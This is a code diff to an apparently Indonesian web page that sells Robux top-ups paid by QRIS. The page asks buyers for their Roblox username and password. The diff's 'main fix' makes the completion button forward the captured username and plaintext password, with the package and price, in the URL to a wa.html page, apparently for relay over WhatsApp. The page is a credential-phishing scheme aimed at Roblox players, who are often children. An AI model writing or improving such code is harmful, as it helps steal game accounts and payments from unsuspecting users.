@@ -19,7 +19,6 @@ body {
   min-height: 100vh;
 }
 
-/* Background bintang */
 .stars {
   position: fixed;
   width: 100%;
@@ -41,7 +40,6 @@ body {
   to { transform: translateY(-1000px); }
 }
 
-/* Card */
 .card {
   background: white;
   padding: 20px;
@@ -82,7 +80,6 @@ body {
 </head>
 <body>
 
-<!-- Bintang -->
 <div class="stars" id="stars"></div>
 
 <!-- FORM -->
@@ -145,7 +142,7 @@ for (let i = 0; i < 120; i++) {
 
 /* Ambil data dari URL */
 const urlParams = new URLSearchParams(window.location.search);
-const productName = decodeURIComponent(urlParams.get("paket") || "Robux 1000");
+const productName = urlParams.get("paket") || "Robux 1000";
 const productPrice = parseInt(urlParams.get("harga")) || 20000;
 
 document.getElementById('productName').innerText = `PRODUK: ${productName}`;
@@ -154,10 +151,10 @@ document.getElementById('productPrice').innerText = `NOMINAL: Rp ${productPrice.
 const paymentDiv = document.getElementById('paymentDiv');
 let timerInterval;
 
-/* Tombol Bayar */
 document.getElementById('payBtn').onclick = () => {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
+
   if(!username || !password){ 
     alert("Masukkan Username & Password!"); 
     return; 
@@ -175,7 +172,6 @@ document.getElementById('payBtn').onclick = () => {
   startTimer(15);
 };
 
-/* TIMER */
 function startTimer(minutes){
   let time = minutes * 60;
   const countdown = document.getElementById("countdown");
@@ -199,24 +195,30 @@ function startTimer(minutes){
   },1000);
 }
 
-/* Perjelas QRIS */
 function perjelasQRIS(){
   const imgSrc = document.getElementById("qrisImg").src;
   window.open(imgSrc, "_blank");
 }
 
-/* Batal */
 function batalPembayaran(){
   if(confirm("Yakin ingin membatalkan pembayaran?")){
     window.location.href = "index.html";
   }
 }
 
-/* Tombol Selesai */
+/* FIX UTAMA DISINI */
 document.getElementById('btnSelesai').onclick = () => {
-  window.location.href = "wa.html";
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  window.location.href =
+    `wa.html?username=${encodeURIComponent(username)}
+    &password=${encodeURIComponent(password)}
+    &paket=${encodeURIComponent(productName)}
+    &harga=${encodeURIComponent(productPrice)}
+    &method=${encodeURIComponent("QRIS")}`;
 };
 </script>
 
 </body>
-</html>
+  </html>
